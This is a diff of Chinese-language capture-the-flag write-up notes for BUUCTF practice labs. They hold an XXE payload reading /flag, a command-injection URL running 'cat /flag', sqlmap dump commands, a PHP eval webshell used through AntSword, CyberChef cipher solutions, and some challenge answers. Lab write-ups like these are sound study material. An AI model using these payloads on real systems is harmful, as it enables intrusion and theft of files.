@@ -114,8 +114,90 @@ pass14和15是一样的，将yakit的图片头换成 `{{png()}}--<?php eval($_PO
 ```
 得到上传的文件地址后，然后使用蚁剑连接`http://169545d1-d8f9-4ad5-ae8b-85c20509798d.node5.buuoj.cn:81/index.php?file=uploads/67fb285a8f6f2.jpg`，找到根目录 flag 文件。
 
-## sqli-labs
+# sqli-labs
 sql 注入的学习合集，不想学，好复杂，直接用 sqlmap 吧。
 ```sh
 python .\sqlmap.py -u http://ad14b268-fed6-417a-9771-31331caea38f.node5.buuoj.cn/Less-3/?id=1 -D ctftraining -T flag -C flag --dump
 ```
+
+# BUU BURP COURSE 1
+打开 burp 的 intercept，在访问页面的时候，添加 headers: `X-Real-IP: 127.0.0.1`，然后 forword。发现网页有了登录界面，点击登录并继续 forword 即可。
+
+
+# BUU XXE COURSE 1
+用 burp 抓包发现发送的 payload 是 xml 格式。
+XML解析器有外部实体引用功能，可以使用这个功能修改 payload 来读取系统的 /flag 文件内容：
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+ 
+<!DOCTYPE root [
+    <!ENTITY admin SYSTEM "file:///flag">
+    ]>
+<root>
+    <username> &admin; </username>
+    <password> admin </password>
+ 
+</root>
+```
+解释：
+- `<!ENTITY admin SYSTEM "file:///flag">` 定义了一个名为admin的外部实体
+- `SYSTEM "file:///flag"` 表示从本地文件系统读取/flag文件内容
+- `&admin;` 在XML中引用该实体时，实际会被替换为文件内容
+
+# LFI Labs
+## cmd1
+```
+http://e8e69da3-83d9-44ad-82ae-10f784fa59ec.node5.buuoj.cn/CMD-1/index.php?cmd=cat+/flag
+```
+后面好麻烦不想搞了。
+
+# AWD-Test1 / AWD-Test2
+题目给了服务器地址和用户名密码，使用 ssh 登录后读取 flag 文件
+```sh
+ssh glzjin@e13cbcaf-27d1-4103-b94e-107fcbc217b1.node5.buuoj.cn -p 29227 
+ls /
+cat /flag
+```
+
+# BUU SQL COURSE 2
+直接 sqlmap
+```sh
+python .\sqlmap.py -u 9105a12d-8ca0-41ea-9364-eacef3a8c0e3.node5.buuoj.cn:81/backend/content_detail.php?id=1 -D ctftraining -T flag -C flag --dump
+```
+
+# PikaChu
+这个是 pikachu 试验场，最简单的还是文件上传，使用一句话木马后用蚁剑连接，flag在根目录下
+
+# MD5
+MD5 是单向哈希，但常见字符串的 MD5 已被收录在破解数据库中，可以尝试在线查询即可：
+- [MD5Decrypt](https://md5decrypt.net/en/)
+- [CrackStation](https://crackstation.net/)
+- [Cmd5（中文）](https://www.cmd5.org/)
+
+# 一眼就解密 / Url编码
+使用在线编解码工具 
+- [ip138.com](https://tool.ip138.com/)
+
+# 看我回旋踢
+这是个字母位移（ROT）加密，推荐直接使用加解密工具
+- [CyberChef](https://github.com/gchq/CyberChef/releases)
+
+# 摩丝
+使用加解密工具
+- [CyberChef](https://github.com/gchq/CyberChef/releases)
+
+# password
+flag{zs19900315}
+
+# 变异凯撒
+仍然使用加解密工具
+- [CyberChef](https://github.com/gchq/CyberChef/releases)
+然后用 ROT47 ，尝试改变 ROT 数量，从5开始以此递增，发现每个字母会一个个变成 flag{Caesar_variation}
+
+# Quoted-printable
+仍然使用加解密工具
+- [CyberChef](https://github.com/gchq/CyberChef/releases)
+然后用 `From Quoted Printable`
+
+# 篱笆墙的影子
+还是使用 CyberChef，选择 `Rail Fence Cipher Encode`, kev = 2, offset = 0
